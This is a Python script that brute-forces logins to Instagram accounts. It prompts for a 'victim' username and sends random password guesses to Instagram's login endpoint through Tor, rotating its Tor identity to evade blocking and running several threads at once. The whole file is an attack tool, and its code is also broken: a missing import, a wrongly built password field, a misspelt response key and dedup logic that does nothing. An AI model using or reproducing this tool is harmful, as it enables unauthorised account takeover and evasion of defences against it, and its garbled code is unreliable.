#!/usr/bin/env python3

import requests
import time 
import json
from stem import Signal
from stem.control import Controller
import random
import threading

username = input("Enter Victim Username >> ")
ask = int(input("Enter the number of threads to be used >> "))
tor_password = input("Enter Your Tor Password >> ")

def guess():
    character = "0123456789abcdefghijklmnopqrstuvwxyz_@#ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    listX = list(character)
    guess_password = ""
    while True:
        guess_password = random.choices(listX,k=random.randint(6,20))
        return guess_password

def rules(myguess):
    if myguess[0] != '#' and myguess[0] != '_' and myguess[0] != '@' :
        if myguess.count("#") < 2 :
            return myguess
        elif myguess.count("@") < 2 :
            return myguess
        elif myguess.count("_") < 2 :
            return myguess
        else :
            return myguess
    else:
        return ['h']

def getlist(x):   #Stores the password so that they are never used again if the same password is repeated then "hello" is given as the word
    lst = []
    word = ''
    for i in x :
        word += i
    if lst.count(word) == 0:
        lst.append(word)
        return word
    else:
        return ""

def tor_session():
    session = requests.session()
    session.proxies = { 'http' : 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050' }
    return session 

def renew_connection():
    with Controller.from_port(port = 9051 ) as controller:
        controller.authenticate(password = tor_password)
        controller.signal(Signal.NEWNYM)

def login(password,session):
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    
    print("Using the password > ",password )

    base_url = "https://www.instagram.com"
    login_url = f"{base_url}/accounts/login/ajax/"
    response_csrf = session.get(base_url)
    csrf = response_csrf.cookies["csrftoken"]
    
    payload = {
    'username' : username ,
    'enc_password' : f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password_hash}',
    'queryParams' : {},
    'optIntoOneTap':'false',
    'trustedDeviceRecords':{} }
    
    login_headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "X-Requested-With":"XMLHttpRequest",
    "Referer" : f"{base_url}/accounts/login/",
    "x-csrftoken" : csrf }

    try:
        response = session.post(login_url , data = payload , headers = login_headers )
        print(response)
        json_res = json.loads(response.text)
        print(json_res)
        if "authenticated" in json_res == True and json_res['auntheticated'] == True:
            return 1
        else:
            return 0
    except:
        return 2

def main():
    session = tor_session()
    while True:
        password = getlist(rules(guess()))
        login_data = login(password , session)
        if login_data == 2:
            renew_connection()
            login_data2 = login(password , session)
            if login_data2 == 2:
                print(f"{password} tried 2 times but no json response was given")
            elif login_data2 == 1:
                print(f"Login Sucessfull with {password}")
                break
            else:
                print(f"Login Failed with {password}")
        elif login_data == 1 :
            print(f"Login Sucessfull with {password}")
            break
        else:
            print(f"Login failed with {password}")

if __name__ == '__main__' :
    threads = []
    for i in range(ask):
        t = threading.Thread(target = main , daemon = False)
        threads.append(t)

    for i in range(ask):
        threads[i].start()

    for i in range(ask):
        threads[i].join() 